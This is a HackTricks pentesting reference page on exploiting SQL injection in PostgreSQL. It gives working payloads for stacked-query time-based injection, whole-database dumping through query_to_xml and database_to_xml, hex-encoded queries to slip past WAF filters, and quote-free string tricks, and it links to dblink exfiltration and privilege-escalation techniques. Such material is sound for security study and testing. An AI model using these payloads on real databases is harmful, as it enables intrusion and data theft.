# PostgreSQL injection

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

***

**This page aims to explain different tricks that could help you to exploit a SQLinjection found in a postgresql database and to compliment the tricks you can find on** [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

## Network Interaction - Privilege Escalation, Port Scanner, NTLM challenge response disclosure & Exfiltration

**`dblink`** is a **PostgreSQL module** that offers several interesting options from the attacker point of view. It can be used to **connect to other PostgreSQL instances** of perform **TCP connections**.\
**These functionalities** along with the **`COPY FROM`** functionality can be used to **escalate privileges**, perform **port scanning** or grab **NTLM challenge responses**.\
[**You can read here how to perform these attacked.**](network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.md)

### **Exfiltration example using dblink and large objects**

You can [**read this example**](dblink-lo\_import-data-exfiltration.md) to see a CTF example of **how to load data inside large objects and then exfiltrate the content of large objects inside the username** of the function `dblink_connect`.

## PostgreSQL Attacks: Read/write, RCE, privesc

Check how to compromise the host and escalate privileges from PostgreSQL in:

{% content-ref url="../../../network-services-pentesting/pentesting-postgresql.md" %}
[pentesting-postgresql.md](../../../network-services-pentesting/pentesting-postgresql.md)
{% endcontent-ref %}

## WAF bypass

### PostgreSQL String functions

Manipulating strings could help you to **bypass WAFs or other restrictions**.\
[**In this page** ](https://www.postgresqltutorial.com/postgresql-string-functions/)**you can find some useful Strings functions.**

### Stacked Queries

Remember that postgresql support stacked queries, but several application will throw an error if 2 responses are returned when expecting just 1. But, you can still abuse the stacked queries via Time injection:

```
id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
```

### XML tricks

**query\_to\_xml**

This function will return all the data in XML format in just one file. It's ideal if you want to dump a lot of data in just 1 row:

```sql
SELECT query_to_xml('select * from pg_user',true,true,'');
```

**database\_to\_xml**

This function will dump the whole database in XML format in just 1 row (be careful if the database is very big as you may DoS it or even your own client):

```sql
SELECT database_to_xml(true,true,'');
```

### Strings in Hex

If you can run **queries** passing them **inside a string** (for example using the **`query_to_xml`** function). **You can use the convert\_from to pass the string as hex and bypass filters this way:**

{% code overflow="wrap" %}
```sql
select encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8');

# Bypass via stacked queries + error based + query_to_xml with hex
;select query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h

# Bypass via boolean + error based + query_to_xml with hex
1 or '1' = (query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -
```
{% endcode %}

### Forbidden quotes

If cannot use quotes for your payload you could bypass this with `CHR` for basic clauses (_character concatenation only works for basic queries such as SELECT, INSERT, DELETE, etc. It does not work for all SQL statements_):

```
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
```

Or with `$`. This queries return the same results:

```
SELECT 'hacktricks';
SELECT $$hacktricks$$;
SELECT $TAG$hacktricks$TAG$;
```

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
